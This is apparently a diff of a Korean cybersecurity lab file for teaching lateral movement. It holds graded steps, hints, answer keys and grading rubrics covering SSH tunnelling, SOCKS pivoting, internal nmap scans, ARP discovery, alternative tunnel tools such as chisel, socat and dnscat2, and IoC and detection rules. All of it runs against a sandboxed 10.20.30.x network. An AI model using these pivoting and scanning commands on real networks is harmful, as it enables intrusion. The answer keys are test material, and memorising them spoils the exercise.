-      intent: 대안 피봇 도구 — socat TCP-LISTEN:8080,fork TCP:SIEM:443 / chisel server -p 8080 --reverse + client
-        R:9090:target:443 / ligolo / rpivot. MITRE T1572 + T1090. SSH 차단 환경용 HTTP/WebSocket 터널.
+      intent: 대안 피봇 도구 — socat TCP-LISTEN:8080,fork TCP:SIEM:443 / chisel server -p
+        8080 --reverse + client R:9090:target:443 / ligolo / rpivot. MITRE T1572 +
+        T1090. SSH 차단 환경용 HTTP/WebSocket 터널.
       success_criteria:
       - Alternative Pivoting Tools 키워드
       - socat + chisel 2개 이상 제시
       - 사용 시나리오 (SSH 차단 등)
       acceptable_methods:
-      - socat TCP 릴레이
-      - chisel HTTP 터널
-      - ligolo-ng / rpivot / revsocks
+      - "socat TCP 릴레이 (수기 baseline, 출력만)."
+      - "chisel HTTP 터널."
+      - "ligolo-ng / rpivot / revsocks."
+      - "ngrok TCP forwarding."
+      - "frp / FRP rport."
+      - "DNScat2 DNS 터널."
+      - "icmptunnel / iodine."
+      - "SSF Secure SSH like."
       negative_signs:
       - 도구 1개 이하
       - 명령 예시 없음
@@ -317,27 +525,49 @@ steps:
   target_vm: attacker
 - order: 11
   instruction: 내부 서비스 열거를 위해 web 서버에서 secu 서버({{SECU_IP}})의 주요 포트를 스캔하라.
-  hint: SSH를 통해 원격에서 nmap을 실행한다
+  hint: |
+    SSH를 통해 원격에서 nmap을 실행한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'nmap -p 22,80,443,3000,5601,9200,5044 10.20.30.1' 2>/dev/null
+    2) 미설치: sudo apt install -y nmap openssh-client
+    3) 실패/대안:
+       - proxychains nmap (SOCKS 통한)
+       - ssh + naabu -host
+       - ssh + masscan -p
+       - ssh + rustscan -a
+       - ssh + nc -zv 다중 포트
+       - ssh + bash for socket scan
+       - meterpreter portscan
+       - autoroute + metasploit modules
+    4) 검증: T1046 Network Service Discovery (피봇).
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1 2>/dev/null' 2>/dev/null
-  answer_detail: 피봇 호스트에서 다른 내부 시스템의 서비스를 열거하면 추가 공격 표면을 파악할 수 있다. 방화벽 서버의 관리 인터페이스가 내부에서만 접근 가능한 경우가
-    많다.
+  answer: ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1 2>/dev/null'
+    2>/dev/null
+  answer_detail: 피봇 호스트에서 다른 내부 시스템의 서비스를 열거하면 추가 공격 표면을 파악할 수 있다. 방화벽 서버의 관리 인터페이스가
+    내부에서만 접근 가능한 경우가 많다.
   verify:
     type: output_contains
     expect: PORT
     field: stdout
     semantic:
-      intent: 피봇 내부 포트 스캔 — ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1'. MITRE T1046
-        Network Service Discovery. secu 방화벽 관리 인터페이스는 내부에서만 접근 가능 → 피봇 경유 스캔 필수.
+      intent: 피봇 내부 포트 스캔 — ssh ccc@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1'.
+        MITRE T1046 Network Service Discovery. secu 방화벽 관리 인터페이스는 내부에서만 접근 가능 → 피봇
+        경유 스캔 필수.
       success_criteria:
       - ssh + nmap -sT 원격 실행
       - 지정 포트 명시 (22,80,443,8080,8443)
       - PORT 헤더 출력
       acceptable_methods:
-      - ssh + nmap -sT
-      - proxychains nmap
-      - for 루프 + nc -zv
+      - "ssh + nmap -sT 다중 포트 (수기 baseline)."
+      - "proxychains nmap."
+      - "ssh + naabu -host."
+      - "ssh + masscan -p."
+      - "ssh + rustscan -a."
+      - "ssh + nc -zv 다중 포트."
+      - "meterpreter portscan."
+      - "autoroute + msf modules."
       negative_signs:
       - 포트 지정 없음
       - SSH 경유 없음
@@ -345,26 +575,48 @@ steps:
   target_vm: attacker
 - order: 12
   instruction: web 서버에서 ARP 테이블을 확인하여 최근 통신한 호스트를 파악하라.
-  hint: ip neigh 또는 arp -a 명령을 사용한다
+  hint: |
+    ip neigh 또는 arp -a 명령을 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'ip neigh show; echo ---; arp -a 2>/dev/null'
+    2) 미설치: sudo apt install -y iproute2 net-tools
+    3) 실패/대안:
+       - cat /proc/net/arp
+       - arp-scan --localnet (broadcast)
+       - tcpdump arp (실시간)
+       - getent ahosts (DNS)
+       - bettercap arp.recon
+       - scapy ARPing 자동화
+       - osquery arp_cache
+       - LinPEAS ARP enum
+    4) 검증: T1018. ARP 캐시 = 최근 통신 호스트.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'ip neigh show 2>/dev/null' 2>/dev/null
-  answer_detail: ARP 테이블에는 최근 L2 통신이 있었던 호스트가 기록된다. 게이트웨이, 서버 간 통신 패턴을 파악하여 네트워크 구조와 중요 시스템을 식별할 수 있다.
+  answer_detail: ARP 테이블에는 최근 L2 통신이 있었던 호스트가 기록된다. 게이트웨이, 서버 간 통신 패턴을 파악하여 네트워크 구조와
+    중요 시스템을 식별할 수 있다.
   verify:
     type: output_contains
     expect: 10.20.30
     field: stdout
     semantic:
-      intent: ARP 테이블 확인 — ssh ccc@10.20.30.80 'ip neigh show'. MITRE T1016 Network Configuration Discovery
-        + T1018. 최근 L2 통신 호스트 기록 → 게이트웨이/서버 간 통신 패턴/중요 시스템 식별.
+      intent: ARP 테이블 확인 — ssh ccc@10.20.30.80 'ip neigh show'. MITRE T1016 Network
+        Configuration Discovery + T1018. 최근 L2 통신 호스트 기록 → 게이트웨이/서버 간 통신 패턴/중요 시스템
+        식별.
       success_criteria:
       - ip neigh 또는 arp -a
       - 10.20.30 대역 호스트 노출
       - L2 이웃 확인
       acceptable_methods:
-      - ip neigh show
-      - arp -a
-      - arp-scan -l
+      - "ip neigh show + arp -a (수기 baseline)."
+      - "cat /proc/net/arp."
+      - "arp-scan --localnet."
+      - "tcpdump arp 실시간."
+      - "bettercap arp.recon."
+      - "scapy ARPing."
+      - "osquery arp_cache."
+      - "LinPEAS ARP enum."
       negative_signs:
       - ARP 테이블 미확인
       - L2 맥락 없음
@@ -372,30 +624,52 @@ steps:
   target_vm: attacker
 - order: 13
   instruction: sshuttle을 사용하여 web 서버를 통한 VPN 수준의 터널을 설정하라.
-  hint: sshuttle -r 사용자@피봇 네트워크대역 형태이다
+  hint: |
+    sshuttle -r 사용자@피봇 네트워크대역 형태이다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo 'sudo sshuttle -r ccc@10.20.30.80 10.20.30.0/24' (출력만)
+    2) 미설치: sudo apt install -y sshuttle
+    3) 실패/대안:
+       - OpenVPN client (CCD pushed routes)
+       - WireGuard (more lightweight)
+       - tinyVPN / SoftEther
+       - sshfs (파일시스템 마운트)
+       - rsync over ssh (대량 파일)
+       - ligolo-ng (TUN/TAP)
+       - Chisel TUN mode
+       - Cloudflare WARP (외부)
+    4) 검증: T1572 + VPN-level full route.
   category: exploit
   points: 10
-  answer: 'echo ''=== sshuttle VPN-over-SSH ==='' && echo ''Command: sshuttle -r ccc@10.20.30.80 10.20.30.0/24''
-    && echo ''Effect: All traffic to 10.20.30.0/24 routed through web server'' && echo ''---'' && echo
-    ''Advantages over SOCKS:'' && echo ''- Transparent: no proxy settings needed'' && echo ''- Works with
-    all TCP tools'' && echo ''- Automatic iptables rules'''
-  answer_detail: sshuttle은 SSH를 통한 투명한 VPN을 구성한다. SOCKS 프록시와 달리 도구별 프록시 설정이 필요 없으며, iptables를 자동으로 구성하여
-    지정 대역의 모든 TCP 트래픽을 터널링한다.
+  answer: 'echo ''=== sshuttle VPN-over-SSH ==='' && echo ''Command: sshuttle -r ccc@10.20.30.80
+    10.20.30.0/24'' && echo ''Effect: All traffic to 10.20.30.0/24 routed through
+    web server'' && echo ''---'' && echo ''Advantages over SOCKS:'' && echo ''- Transparent:
+    no proxy settings needed'' && echo ''- Works with all TCP tools'' && echo ''-
+    Automatic iptables rules'''
+  answer_detail: sshuttle은 SSH를 통한 투명한 VPN을 구성한다. SOCKS 프록시와 달리 도구별 프록시 설정이 필요 없으며,
+    iptables를 자동으로 구성하여 지정 대역의 모든 TCP 트래픽을 터널링한다.
   verify:
     type: output_contains
     expect: sshuttle VPN
     field: stdout
     semantic:
-      intent: sshuttle VPN-over-SSH — sshuttle -r ccc@10.20.30.80 10.20.30.0/24. MITRE T1572 + T1090 Proxy.
-        투명 VPN + iptables 자동 구성. SOCKS과 달리 도구별 프록시 설정 불필요. 모든 TCP 트래픽 터널링.
+      intent: sshuttle VPN-over-SSH — sshuttle -r ccc@10.20.30.80 10.20.30.0/24. MITRE
+        T1572 + T1090 Proxy. 투명 VPN + iptables 자동 구성. SOCKS과 달리 도구별 프록시 설정 불필요. 모든
+        TCP 트래픽 터널링.
       success_criteria:
       - sshuttle -r 사용자@피봇 대역
       - sshuttle VPN 키워드
       - 투명 VPN 장점 설명
       acceptable_methods:
-      - sshuttle -r
-      - OpenVPN over SSH
-      - WireGuard + SSH 터널
+      - "sshuttle -r ccc@pivot subnet (수기 baseline)."
+      - "OpenVPN over SSH."
+      - "WireGuard + SSH 터널."
+      - "tinyVPN / SoftEther."
+      - "sshfs (filesystem mount)."
+      - "rsync over ssh."
+      - "ligolo-ng TUN/TAP."
+      - "Chisel TUN mode."
       negative_signs:
       - sshuttle 명령 없음
       - 네트워크 대역 누락
@@ -403,146 +677,166 @@ steps:
   target_vm: attacker
 - order: 14
   instruction: 측면 이동의 탐지 지표(IoC)를 정리하라. 네트워크 기반과 호스트 기반 지표를 각각 나열하라.
-  hint: 비정상 SSH 연결, 포트 포워딩, 인증 로그를 분석한다
+  hint: |
+    비정상 SSH 연결, 포트 포워딩, 인증 로그를 분석한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: heredoc/echo -e > /tmp/lateral_iocs.txt 후 [Network IOCs]/[Host IOCs] 2섹션 + Sigma rule 매핑
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - last/lastlog 로그 분석
+       - journalctl -u ssh
+       - /var/log/auth.log grep
+       - Wazuh / Splunk SSH rule
+       - Suricata SSH ruleset
+       - Velociraptor SSH artifacts
+       - osquery logged_in_users
+       - Sigma rules YAML
+    4) 검증: T1021.004 SSH IoCs (NIDS+HIDS).
   category: analysis
   points: 15
-  answer: 'echo -e ''=== Lateral Movement IoCs ===\n\n[Network-based]\n1. Unusual SSH connections between
-    servers\n2. Port forwarding traffic patterns\n3. SOCKS proxy traffic on non-standard ports\n4. Increased
-    internal scanning activity\n5. SMB/WinRM traffic from non-admin hosts\n\n[Host-based]\n1. New SSH
-    authorized_keys entries\n2. Unusual login times/sources in auth.log\n3. New processes: ssh -L, ssh
-    -D, socat, chisel\n4. Modified known_hosts file\n5. Credential files accessed/copied\n\n[Detection
-    Tools]\n- Wazuh: auth.log monitoring\n- Suricata: network anomaly detection\n- Zeek: SSH session analysis'''
-  answer_detail: 측면 이동 탐지는 네트워크 트래픽 분석(NTA)과 호스트 로그 분석을 병행해야 한다. Wazuh SIEM에서 SSH 로그 이상, Suricata에서 내부
-    스캐닝 탐지, Zeek에서 SSH 터널 식별이 가능하다.
+  answer: 'echo -e ''=== Lateral Movement IoCs ===\n\n[Network-based]\n1. Unusual
+    SSH connections between servers\n2. Port forwarding traffic patterns\n3. SOCKS
+    proxy traffic on non-standard ports\n4. Increased internal scanning activity\n5.
+    SMB/WinRM traffic from non-admin hosts\n\n[Host-based]\n1. New SSH authorized_keys
+    entries\n2. Unusual login times/sources in auth.log\n3. New processes: ssh -L,
+    ssh -D, socat, chisel\n4. Modified known_hosts file\n5. Credential files accessed/copied\n\n[Detection
+    Tools]\n- Wazuh: auth.log monitoring\n- Suricata: network anomaly detection\n-
+    Zeek: SSH session analysis'''
+  answer_detail: 측면 이동 탐지는 네트워크 트래픽 분석(NTA)과 호스트 로그 분석을 병행해야 한다. Wazuh SIEM에서 SSH
+    로그 이상, Suricata에서 내부 스캐닝 탐지, Zeek에서 SSH 터널 식별이 가능하다.
   verify:
     type: output_contains
     expect: Lateral Movement IoCs
     field: stdout
     semantic:
-      intent: 측면 이동 IoC — [Network] 비정상 내부 SSH + 포트 포워딩 트래픽 + 비표준 SOCKS + 내부 스캐닝 + SMB/WinRM / [Host]
-        신규 authorized_keys + 비정상 로그인 시간 + ssh -L/-D 프로세스 + known_hosts 변경 / [탐지] Wazuh + Suricata + Zeek.
-        MITRE T1021/T1572/T1078.
+      intent: 측면 이동 IoC — [Network] 비정상 내부 SSH + 포트 포워딩 트래픽 + 비표준 SOCKS + 내부 스캐닝 +
+        SMB/WinRM / [Host] 신규 authorized_keys + 비정상 로그인 시간 + ssh -L/-D 프로세스 + known_hosts
+        변경 / [탐지] Wazuh + Suricata + Zeek. MITRE T1021/T1572/T1078.
       success_criteria:
       - Lateral Movement IoCs 키워드
       - Network-based + Host-based 2섹션
       - 탐지 도구 (Wazuh/Suricata/Zeek) 명시
       acceptable_methods:
-      - Network + Host IoC 구분
-      - MITRE D3FEND 매핑
-      - Sigma 룰 예시
+      - "Network + Host IoC 구분 (수기 baseline)."
+      - "last/lastlog + journalctl ssh."
+      - "/var/log/auth.log grep."
+      - "Wazuh / Splunk SSH rule."
+      - "Suricata SSH ruleset."
+      - "Velociraptor SSH artifacts."
+      - "osquery logged_in_users."
+      - "Sigma rules YAML."
       negative_signs:
       - 1섹션만 존재
       - 탐지 도구 없음
       - IoC 3개 이하
   target_vm: attacker
 - order: 15
-  instruction: 측면 이동 실습 결과를 /tmp/lateral_movement_report.txt에 정리하라. 이동 경로, 사용 기법, 방어 권고를 포함하라.
-  hint: 공격 경로를 다이어그램으로 표현하라
+  instruction: 측면 이동 실습 결과를 /tmp/lateral_movement_report.txt에 정리하라. 이동 경로, 사용 기법,
+    방어 권고를 포함하라.
+  hint: |
+    공격 경로를 다이어그램으로 표현하라.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: heredoc/echo -e > /tmp/lateral_movement_report.txt 후 [Path]/[Techniques]/[Recommendations] 3섹션 + ASCII diagram
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - mermaid 다이어그램 (markdown 호환)
+       - graphviz dot (SVG/PNG)
+       - python jinja2 markdown
+       - dradis 보고서
+       - serpico / Faraday
+       - MITRE ATT&CK Navigator
+       - Cyber Kill Chain 매핑
+       - bloodhound (Active Directory)
+    4) 검증: 3 섹션 + path diagram + T1021.004/T1090.
   category: analysis
   points: 15
-  answer: echo -e '=== Lateral Movement Report ===\n\n[Attack Path]\nattacker(201) --SSH--> web(80) --SSH-->
-    secu(1)\n                              \\--SSH--> siem(100)\n\n[Techniques Used]\n1. SSH Local Port
-    Forwarding (T1572)\n2. SSH Dynamic Port Forwarding/SOCKS (T1572)\n3. Credential Reuse (T1078)\n4.
-    SSH ProxyJump (T1021.004)\n5. Internal Network Scanning (T1046)\n\n[Credentials Obtained]\n- web:1
-    (SSH)\n- secu:1 (SSH, credential reuse)\n- siem:1 (SSH, credential reuse)\n\n[Recommendations]\n1.
-    Unique passwords per system\n2. SSH key-only auth (disable password)\n3. Network segmentation with
-    strict ACLs\n4. Monitor internal SSH connections\n5. Implement jump host with MFA' > /tmp/lateral_movement_report.txt
-    && cat /tmp/lateral_movement_report.txt
-  answer_detail: 측면 이동 보고서는 공격 경로(Attack Path)를 시각적으로 표현하고, 각 hop에서 사용된 기법과 자격 증명을 명시한다. 네트워크 세분화, 제로
-    트러스트 아키텍처 도입을 권고한다.
+  answer: echo -e '=== Lateral Movement Report ===\n\n[Attack Path]\nattacker(201)
+    --SSH--> web(80) --SSH--> secu(1)\n                              \\--SSH--> siem(100)\n\n[Techniques
+    Used]\n1. SSH Local Port Forwarding (T1572)\n2. SSH Dynamic Port Forwarding/SOCKS
+    (T1572)\n3. Credential Reuse (T1078)\n4. SSH ProxyJump (T1021.004)\n5. Internal
+    Network Scanning (T1046)\n\n[Credentials Obtained]\n- web:1 (SSH)\n- secu:1 (SSH,
+    credential reuse)\n- siem:1 (SSH, credential reuse)\n\n[Recommendations]\n1. Unique
+    passwords per system\n2. SSH key-only auth (disable password)\n3. Network segmentation
+    with strict ACLs\n4. Monitor internal SSH connections\n5. Implement jump host
+    with MFA' > /tmp/lateral_movement_report.txt && cat /tmp/lateral_movement_report.txt
+  answer_detail: 측면 이동 보고서는 공격 경로(Attack Path)를 시각적으로 표현하고, 각 hop에서 사용된 기법과 자격 증명을
+    명시한다. 네트워크 세분화, 제로 트러스트 아키텍처 도입을 권고한다.
   verify:
     type: output_contains
     expect: Lateral Movement Report
     field: stdout
     semantic:
-      intent: '측면 이동 보고서 — echo > /tmp/lateral_movement_report.txt: [Attack Path] attacker→web→secu +
-        siem / [Techniques] T1572 + T1078 + T1021.004 + T1046 / [Credentials] web/secu/siem + [Recommendations]
-        유니크 비번 + SSH 키 전용 + 네트워크 세분화 + 점프호스트 MFA. 공격 경로 다이어그램.'
+      intent: '측면 이동 보고서 — echo > /tmp/lateral_movement_report.txt: [Attack Path]
+        attacker→web→secu + siem / [Techniques] T1572 + T1078 + T1021.004 + T1046
+        / [Credentials] web/secu/siem + [Recommendations] 유니크 비번 + SSH 키 전용 + 네트워크
+        세분화 + 점프호스트 MFA. 공격 경로 다이어그램.'
       success_criteria:
       - Lateral Movement Report 키워드
       - Attack Path + Techniques + Recommendations 3섹션
       - MITRE T1572/T1078/T1021.004 매핑
       acceptable_methods:
-      - echo > 보고서 + MITRE ID
-      - ATT&CK Navigator 매핑
-      - PTES Pivoting 보고서
+      - "heredoc > 보고서 + ASCII diagram (수기 baseline)."
+      - "mermaid 다이어그램 (markdown)."
+      - "graphviz dot (SVG)."
+      - "python jinja2 markdown."
+      - "dradis 보고서."
+      - "MITRE ATT&CK Navigator."
+      - "Cyber Kill Chain 매핑."
+      - "bloodhound (AD)."
       negative_signs:
       - MITRE ID 없음
       - 공격 경로 다이어그램 없음
       - 권고 3개 이하
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "Adversary Emulation 컨설턴트 — 클라이언트 CISO 와 Slack 대화 transcript"
-
-    ## 상황 — 화요일 16:00, Slack DM 진행 중
-
-    당신은 *MITRE-style Adversary Emulation Lead*. 클라이언트 CISO 가 *APT29-style lateral movement
-    시뮬레이션* 의뢰. Slack DM 으로 실시간 보고.
-
-    > [client CISO] "오후 4시까지 SSH-tunnel 기반 lateral 시도 부탁. SIEM 가 잡으면 다행, 못 잡으면 룰 보강.
-    > 20분 단위로 paste 해 줘."
-
-    학습 목표 (lecture #1·#2 nftables/Suricata + #4 nmap timing) + (lab #1·#2·#3·#5·#11) 통합.
-
-    ## 산출물 — Slack DM 7 메시지 transcript + 명령 + Detection Delta
-
-    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
-
-    ### [16:00] CISO → 컨설턴트
-    > "시작해. ATT&CK T1021.004 SSH 기반. IDS 우회 시도도."
-
-    ### [16:02] 컨설턴트 → CISO
-    > "📡 정찰 — TCP-only 스캔."
-    `sudo -n nmap -sT -Pn -p 22,80,443,3000,3306,8080 --max-rtt-timeout 1000 -T2 10.20.30.0/24 2>&1 | head -25`
-
-    ### [16:08] 컨설턴트 → CISO
-    > "🔑 SSH local fwd — secu:22 → SIEM:443."
-    `timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -L 18443:10.20.30.100:443 -N ccc@10.20.30.80 2>&1 | head -5 || echo "[차단/실패 결과]"`
-
-    ### [16:14] 컨설턴트 → CISO
-    > "🔁 SOCKS 프록시 (-D)."
-    `timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -D 11080 -N ccc@10.20.30.80 2>&1 | head -5 || echo "[SOCKS 결과]"`
-
-    ### [16:18] CISO → 컨설턴트
-    > "SSH-key auth 알림 1건 떴는데 tunnel-fwd 자체 못 잡음. 보강 어떻게?"
-
-    ### [16:20] 컨설턴트 → CISO
-    > "Suricata vs auditd visibility 갭. SSH 페이로드 암호화 → DPI 불가. 방안 3:
-    >   ① auditd: SSH client exec + -L/-D 인자
-    >   ② nftables ct state: outbound :443 to siem 는 jump 만 (egress allowlist)
-    >   ③ Wazuh 룰 100400: 'ssh.*-L\\|-D' 정규식 + jumpadmin 외 alert"
-    `cat <<'EOF'
-    table inet pivot_block {
-      chain output {
-        type filter hook output priority 0; policy accept;
-        ip daddr 10.20.30.100 tcp dport 443 ip saddr != 10.20.30.201 drop log prefix "PIVOT-DROP "
-      }
-    }
-    EOF`
-
-    ### [16:25] 컨설턴트 → CISO
-    > "Detection Delta:"
-    ```
-    | 기법 | ATT&CK | Suricata | auditd | Wazuh | 종합 |
-    | nmap -sT recon | T1046 | T | F | T | 탐지 |
-    | SSH -L | T1021.004 | F | F | F | 누락 |
-    | SSH -D | T1090 | F | F | F | 누락 |
-    | SSH auth | T1021.004 | T | T | T | 탐지 |
-    | proxychains | T1090.001 | F | T | F | 부분 |
-    ```
-
-    ### [16:30] CISO 결정
-    > "auditd 룰 + nftables egress 다음 sprint 반영. 0900 brief — Delta 5행 + 보강 plan."
-
-    ### [16:31] 컨설턴트
-    > "👍 transcript export. 굿잡 — 내일."
-
-    종료: echo "=== Slack Transcript [16:00-16:31] ===" + 7 메시지 + Delta.
+  instruction: "[복합 시나리오] \"Adversary Emulation 컨설턴트 — 클라이언트 CISO 와 Slack 대화 transcript\"\
+    \n\n## 상황 — 화요일 16:00, Slack DM 진행 중\n\n당신은 *MITRE-style Adversary Emulation Lead*.\
+    \ 클라이언트 CISO 가 *APT29-style lateral movement\n시뮬레이션* 의뢰. Slack DM 으로 실시간 보고.\n\
+    \n> [client CISO] \"오후 4시까지 SSH-tunnel 기반 lateral 시도 부탁. SIEM 가 잡으면 다행, 못 잡으면\
+    \ 룰 보강.\n> 20분 단위로 paste 해 줘.\"\n\n학습 목표 (lecture #1·#2 nftables/Suricata + #4\
+    \ nmap timing) + (lab #1·#2·#3·#5·#11) 통합.\n\n## 산출물 — Slack DM 7 메시지 transcript\
+    \ + 명령 + Detection Delta\n\nNon-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.\n\
+    \n### [16:00] CISO → 컨설턴트\n> \"시작해. ATT&CK T1021.004 SSH 기반. IDS 우회 시도도.\"\n\n\
+    ▶ [16:02] 컨설턴트 → CISO\n> \"\U0001F4E1 정찰 — TCP-only 스캔.\"\n`sudo -n nmap -sT\
+    \ -Pn -p 22,80,443,3000,3306,8080 --max-rtt-timeout 1000 -T2 10.20.30.0/24 2>&1\
+    \ | head -25`\n\n### [16:08] 컨설턴트 → CISO\n> \"\U0001F511 SSH local fwd — secu:22\
+    \ → SIEM:443.\"\n`timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3\
+    \ -L 18443:10.20.30.100:443 -N ccc@10.20.30.80 2>&1 | head -5 || echo \"[차단/실패\
+    \ 결과]\"`\n\n### [16:14] 컨설턴트 → CISO\n> \"\U0001F501 SOCKS 프록시 (-D).\"\n`timeout\
+    \ 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -D 11080 -N ccc@10.20.30.80\
+    \ 2>&1 | head -5 || echo \"[SOCKS 결과]\"`\n\n### [16:18] CISO → 컨설턴트\n> \"SSH-key\
+    \ auth 알림 1건 떴는데 tunnel-fwd 자체 못 잡음. 보강 어떻게?\"\n\n### [16:20] 컨설턴트 → CISO\n> \"\
+    Suricata vs auditd visibility 갭. SSH 페이로드 암호화 → DPI 불가. 방안 3:\n>   ① auditd: SSH\
+    \ client exec + -L/-D 인자\n>   ② nftables ct state: outbound :443 to siem 는 jump\
+    \ 만 (egress allowlist)\n>   ③ Wazuh 룰 100400: 'ssh.*-L\\\\|-D' 정규식 + jumpadmin\
+    \ 외 alert\"\n`cat <<'EOF'\ntable inet pivot_block {\n  chain output {\n    type\
+    \ filter hook output priority 0; policy accept;\n    ip daddr 10.20.30.100 tcp\
+    \ dport 443 ip saddr != 10.20.30.201 drop log prefix \"PIVOT-DROP \"\n  }\n}\n\
+    EOF`\n\n### [16:25] 컨설턴트 → CISO\n> \"Detection Delta:\"\n```\n| 기법 | ATT&CK |\
+    \ Suricata | auditd | Wazuh | 종합 |\n| nmap -sT recon | T1046 | T | F | T | 탐지\
+    \ |\n| SSH -L | T1021.004 | F | F | F | 누락 |\n| SSH -D | T1090 | F | F | F | 누락\
+    \ |\n| SSH auth | T1021.004 | T | T | T | 탐지 |\n| proxychains | T1090.001 | F\
+    \ | T | F | 부분 |\n```\n\n### [16:30] CISO 결정\n> \"auditd 룰 + nftables egress 다음\
+    \ sprint 반영. 0900 brief — Delta 5행 + 보강 plan.\"\n\n### [16:31] 컨설턴트\n> \"\U0001F44D\
+    \ transcript export. 굿잡 — 내일.\"\n\n종료: echo \"=== Slack Transcript [16:00-16:31]\
+    \ ===\" + 7 메시지 + Delta."
   hint: |
     7 메시지 형식. 시간 도장 [16:00-16:31]. timeout 5 안전.
     nftables snippet heredoc. Detection Delta 5행.
     포인트: Slack DM transcript, 보고서 X.
+
+    📎 도구 우선순위 (힌트):
+    1) Slack 메시지 형식: 시간 도장 [HH:MM] + 컨설턴트/CISO 구분.
+    2) timeout 5: 모든 ssh/nmap 명령에 timeout 적용 (안전).
+    3) ssh -L 실증: timeout 5 ssh -f -N -L 8443:secu:443 ccc@web.
+    4) ssh -D SOCKS: timeout 5 ssh -f -N -D 1080 + proxychains nmap.
+    5) nftables egress allowlist: heredoc 'table inet egress { chain output { ... } }'.
+    6) Detection Delta 5행: markdown table (T-ID/Wazuh/Suricata/auditd/탐지).
+    7) 미설치 시: sudo apt install -y openssh-client sshpass nftables nmap proxychains
+    8) Slack 표준 형식: 마크다운 + 이모지 + ` ` 코드블록.
+    9) Bug Bounty / Red Team 컨설턴트 페르소나 톤 (전문 + 친근).
   category: integration_scenario
   points: 50
   verify:
@@ -550,9 +844,12 @@ steps:
     expect: Transcript
     field: stdout
     semantic:
-      intent: |
-        Adversary Emulation 컨설턴트 — 클라이언트 CISO Slack DM 7 메시지 + SSH tunnel 명령 +
+      intent: 'Adversary Emulation 컨설턴트 — 클라이언트 CISO Slack DM 7 메시지 + SSH tunnel 명령
+        +
+
         nftables egress + Detection Delta 5행. *Slack transcript* 산출물.
+
+        '
       success_criteria:
       - 7 메시지 시간 도장
       - SSH -L / -D 실 명령 (timeout 5)
@@ -560,11 +857,14 @@ steps:
       - Detection Delta 5행
       - CISO 결정 + 컨설턴트 마무리
       acceptable_methods:
-      - heredoc 메시지
-      - nmap / ssh -L / -D / timeout
-      - heredoc nftables snippet
-      - markdown table
-      - 친근한 Slack 톤 (이모지)
+      - "heredoc Slack 메시지 7개 + 시간 도장 (수기 baseline)."
+      - "ssh -L / -D timeout 5 안전 명령."
+      - "proxychains nmap (SOCKS)."
+      - "heredoc nftables egress allowlist."
+      - "markdown table (Detection Delta)."
+      - "MITRE ATT&CK ID 매핑."
+      - "친근한 Slack 톤 + 이모지."
+      - "CISO/컨설턴트 페르소나 일관성."
       negative_signs:
       - 메시지 5개 이하
       - 시간 도장 누락
@@ -573,5 +873,7 @@ steps:
       - 페르소나 일관성 없음
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접. Slack DM transcript — 보고서 X. SSH tunnel SIEM 가시성 갭 + 보강.
+  answer_detail: '학생이 ssh attacker 직접. Slack DM transcript — 보고서 X. SSH tunnel SIEM
+    가시성 갭 + 보강.
+
+    '
